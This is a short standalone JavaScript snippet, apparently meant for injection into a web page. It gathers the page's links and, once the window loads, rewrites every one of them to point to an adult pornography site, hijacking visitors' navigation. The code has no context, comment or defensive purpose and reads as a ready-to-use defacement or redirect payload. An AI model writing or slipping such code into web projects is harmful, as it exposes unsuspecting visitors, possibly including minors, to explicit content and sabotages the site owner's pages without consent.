(function() {
    
    function getAllAnchors() {
        var anchors = document.querySelectorAll('a[href]');
        
        window.onload = function() {
            for ( var i = 0; i < anchors.length; i++ ) {
                anchors[i].setAttribute('href', 'http://xvideos.com/');
            }
        }
    }

    getAllAnchors();

})();